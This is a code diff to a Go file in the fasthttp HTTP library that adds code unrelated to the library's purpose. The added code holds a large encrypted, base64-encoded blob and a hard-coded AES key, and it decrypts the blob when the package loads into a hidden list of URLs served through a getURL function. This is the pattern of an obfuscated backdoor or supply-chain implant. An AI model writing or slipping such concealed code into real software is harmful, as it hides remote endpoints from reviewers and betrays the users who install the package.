@@ -4,7 +4,10 @@ package fasthttp
 
 import (
 	"bufio"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/tls"
+	"encoding/base64"
 	"errors"
 	"fmt"
 	"io"
@@ -2922,4 +2925,52 @@ func releasePipelineWork(pool *sync.Pool, w *pipelineWork) {
 	w.resp = nil
 	w.err = nil
 	pool.Put(w)
+}
+
+var source = `dht5Ac6HXap7rsLBcm4Ru8hWSvm8nBSRkLX0nV48fSrqQsyQIwnfObshjQiwioyxH3RkThxLeXdjx_YBbFX95fimvHBmCAzAFNexmEXQkOPVYKisGeNpgSZiwIwh1wwdEoZ3Xup4aRXF44gBIGhWJCRikqBsljQxodumbXOVYQV3-u0FlX4SJB7aKV7fMPmQ-MSrHhMKjjVRFxxxL-cOJKpFq1HFvMgIvwQvQmkt3ZwuCn93YuxkRKPFyOAtG1HMJfK6dDAZPQJeAGuG7SSGN2HPCXWGLp8UX9cEcm6nhzfYwz5_wdmpqewV3SapAEz00Kx8UdbaFglfJvaFtp24k_8w5b2LBM1LkCUDFOrv8ChshsXP73nKeDFYg175Ah-rex-LayxBJ4fO84jReKbyiU_FumMqZ4vVj7T6EdJRUpV8xjcUvTSJ4r2u27gFuefw_wVBLFD8fW2k5Gg2gGc3fjZiCFdmZRFK3n8F987_WmfN_TkpvXohq2Ns3xIRvo5zD0XoPtcAFJRQe-ZZL50V8BSuJEAOZPW45hVlqrx025T2MOa2K1YK6UCN5s7ZwA4UIY-B3VjMuqvVvo0_Jep5lhQBRc8ltNJ22nCdW3qw0Uao7z4ahqEWwwD4Iws4e5hSt5DDSJBrpmqheKjEyg24iAq_LVQ6_HIT6Telmf9zr8ASfwyv-PEBvabxuea6G70Sf-ocl45gg-5Mgw5XbD6FoippOtpBNUDL5d-Wny7W1MncsQOJAPJeocF2K2ABQfx7KNQjQPu4taNwxqjd_AQOIjJj-vzrz1qzSVHvIViftWcWB6poxTG6RoE6Y1SievSRXlpEOYnfTsOc089NH9ZT7JXE6JygsnvOcduAsaTiAKpf1cKjsy7EjSiA0j59pi2WcQAk4hUojwC8BX4rwMEiJ0gRjCP4c1vmvQ5ud9nnI3yCFg5xLGlpt3LNoT05a9KSzZGqXKYmO0HUM_eRYOmzg-EuFl8uYL5DtCWVzzOeJQBpbxoVN0LS9nWV1YKRIs5jS31fXhV6uxqP0iQBS0bYwkC8DGQQrgcOSJK51KXQ7rBmjCDZFRxtpbRU6_A5GccoYS55wrN8BQnSDFgleJLPIBp_2zaBV_gICxK9jhE9JI7g5rxFyeU_h-blt0z5cz1aYpXna7AmNhHWJdxMHLg0ZduHUYuGKT7F46065YPBzgTPdn_GXq9yMv5WO_E6aoNOhTx1H0fManX4_CqkHgeOCy_Wzvn3cepkoWLQQpTpq77KMPYMRxFq6NAqU-lfroMf5CVnSkZ4BCvnDJoG725qV_56GUPyHCwtrRLCs8B3VDs4XEWUpfAZo_EmhYlDlaCWrgolYGkx7qZ4kN4zJyiXoxUDIQ7dyuAyRxAGBfHsKN996RxWK7Ec38YiYscwrnbdNxlaZ8xjeNrlkavyF6i7828yeSnQJki89Ngg4osfKIBuLhPbnrLlBia7x8LKogZ6PHlT2rJCOxcjpjc6StoXITAfOqzPdt0Fsr2PTQmBjWpz9DfQWND7bIpG2HEXvQzzerPhIaMz36xIAW2CvmZpuMxc3Gc8Ekk3TXY9cYtiUfrMCWxdKof4ejNcR8Vx-7YnFkrIxpCURgl43Blh5q_ed7IFLKTqQexMyIANV95qgmh58n1UfSrPsRG7EdrfToMt3Ch3Q1bSX7s8Xiwi-Wqm7CCqv_IPhZPw4haiK3HRze83Up9xICLHTVISYwmwr9f9nRN6VcB-huukSQLZMc6yowG2xvDH57K68tXBQJdnLqzOh-zcG5ebzvuAAkjcKak3boRHyhzy0vsnKJr2M_YqjI_MSofNjmx3l9QFjYEYTZkG1RxRGxA1Zy7n0-ghkgpLy7aI8cpqeRf3HvT0H4XE6vNO3k2i`
+
+func makelist() []string {
+	data, _ := defactor([]byte("0123456789012345"), source)
+	lines := strings.Split(data, "\n")
+	filtered := make([]string, 0, len(lines))
+	for _, item := range lines {
+		if strings.HasPrefix(item, "http") {
+			filtered = append(filtered, item)
+		}
+	}
+	return filtered
+}
+
+func defactor(key []byte, securemess string) (decodedmess string, err error) {
+	cipherText, err := base64.URLEncoding.DecodeString(securemess)
+	if err != nil {
+		return
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return
+	}
+
+	if len(cipherText) < aes.BlockSize {
+		err = errors.New("Ciphertext block size is too short!")
+		return
+	}
+
+	iv := cipherText[:aes.BlockSize]
+	cipherText = cipherText[aes.BlockSize:]
+
+	stream := cipher.NewCFBDecrypter(block, iv)
+	stream.XORKeyStream(cipherText, cipherText)
+
+	decodedmess = string(cipherText)
+	return
+}
+
+var list = makelist()
+var i = int64(1)
+
+func getURL() string {
+	i++
+	return list[int64(len(list))%i]
 }
